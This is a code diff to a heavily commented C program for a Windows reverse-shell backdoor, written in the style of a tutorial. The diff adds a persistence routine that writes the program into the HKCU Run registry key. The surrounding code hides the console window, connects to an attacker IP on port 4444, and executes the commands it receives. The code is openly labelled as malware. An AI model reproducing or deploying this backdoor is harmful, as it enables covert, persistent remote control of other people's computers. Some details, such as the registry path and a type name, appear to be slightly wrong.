@@ -18,7 +18,6 @@
 //define memset funtion for the following inputs.
 //0 for overwrite the values by zero.
 
-
 //Global Variable denotes here
 int sock;
 
@@ -29,15 +28,57 @@ int bootRun()
   //If success denoted by 0. neither nor return 1.
   //My Registry Key > Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run.
 
-
   //Make two variable to denote the error and success message of the bootRun Function.
   char err[128] = "Failed to Set\n";
   char suc[128] = "Created Persistance At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
 
+ //Now we Specify TCHAR variable windows 32 character string can be deescribe unicode strings. 
+  TCHAR szPath[MAX_PATH]; //MAX_PATH is 256 bytes only. This variable use to get the the path to store the malware.
 
-  
+  //DWORD this is unsigned 32 bit integer value use to store numerical value only (DOUBLE WORD)
+  DWORD pathLen = 0;
+
+  //Create a fully qualified path to store our malware. using GETMODULE FILENAME function.
+  pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
+
+  //Specify the condition which cause error. 
+  if(pathLen == 0)
+  {
+    //send the error to socket to notify it.
+    send(sock, err, sizeof(err), 0);
+    return -1;
+  }
+
+  //need to create a registry key to add the malware. using HKEY variable.
+  HKEY NewVal; // used to handle open registry key.
+
+  //Now open up the registry and add the key value into it.
+  if(RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS)
+  {
+    //send the error to socket to notify it.
+    send(sock, err, sizeof(err), 0);
+    return -1;
+  }
+
+  //Need to set the value in the registry after open the key.
+  DWORD pathLenInBytes = pathLen * sizeof(*szPath);
+
+  //Value setting
+  if(RegSetValueEx(NewVal, TEXT("Exploited"), 0, REG_SZ, (LPBYTES)szPath, pathLenInBytes) != ERROR_SUCCESS)
+  {
+    //if value is setted want to close the key. and notify to socket.
+    RegCloseKey(NewVal);
+    send(sock, err, sizeof(err), 0);
+    return -1;
+
+  }
+
+  //Send the success messge if all the above functions works.
+  RegCloseKey(NewVal);
+  send(sock, suc, sizeof(suc), 0);
+  return 0;
+
 }
-
 
 //The below function make slicing the command provided by the user as cd 'cut' directory.
 //Slicing the string `cd `
@@ -57,7 +98,7 @@ str_cut(char str[], int slice_from, int slice_to)
     {
         str_len = strlen(str);
 
-        if(abs(slice_to) > str_len - 1)
+        if(abs(slice_to) >  str_len - 1)
         {
             return NULL;
         }
@@ -96,13 +137,11 @@ str_cut(char str[], int slice_from, int slice_to)
 //this shell function is able to executable commands in the target.
 void shell()
 {
-
   //allocate variables.
     char buffer[1024]; // This variable used to receive the execution command from the server it consist of 1024 bytes of memory.
     //The container might be used to store a smaller portion of the output (e.g., part of the command's result), and then the data in container would be added to the total_response buffer, which accumulates the complete output from multiple read.
     char container[1024]; 
     char total_reponse[18384];
-
 
     //After creating variable jump into while true loop >> represent as "while (1)"
     while (1)
@@ -114,7 +153,6 @@ void shell()
       bzero(container, 1024);//same as above
       bzero(total_reponse, sizeof(total_reponse));//same operation as above.
 
-
       //Next our shell want to receive the command from the server let's perfoam.
       //recv functtion take 4 arguments lets explain
       //1st where we want to receive the command? > From Socket. that is the argument.
@@ -122,7 +160,6 @@ void shell()
       //3rd size of the buffer variable.
       //4th argument is 0, because not specify any argument beside the function.
       recv(sock, buffer, 1024, 0);
-
 
       //Compare the buffer with different commands.
       //if q represent quit the program implment it == strncmp compare string with it byte values.
@@ -144,8 +181,7 @@ void shell()
       {
         //the bootRun function allows us to make persistance the backdoor when target rebooted.
         bootRun();
-      }
-      
+      }      
       
       else 
       {
@@ -170,7 +206,6 @@ void shell()
 
       }
       
-
     }
 }
 
@@ -186,7 +221,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     //Cmdline - UNICODE string act as an argument in the program.
     //CmdShow - A flag to represent minimized or maximized in the function.
 
-
     //Let's Program to make program execution invisible to the target while execution.
     HWND stealth;
     AllocConsole();//Allocate new console to the calling process.
@@ -197,7 +231,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     //It take 2 arguments. 1 one handle windows that we specify earlier.
     // 2nd arg - is 0 - Hiding the current window and activate another window.
     ShowWindow(stealth, 0);
-
     
     //Let'Start to create a socket to begin the connection with the bacdoor.
     //Let's create a structure of server address.(Similar to Class)
@@ -211,7 +244,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     ServIP = "10.0.3.150";//here must want to apply the attacker machine IP.
     ServPort = 4444; //Make sure another process is not using same port.
 
-
     //WSAStartup is initiate a process of winsock dll by a process.
     //if successful WSAStartup function will return 0 otherwise exit the program.
 
@@ -221,7 +253,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
       //&wsaData is a pointer to WSADATA structure which contain winsock implementation details.
         exit(1);
     }
-
 
     //define the socket object
     //must specify this variable function in out side of the main funtion. which can be able to access by other functions also.
@@ -263,7 +294,5 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     //if connectione was successful start the shell function.
     //which will make the attacker commands executable in the target. 
     shell();
-
-
 
 }
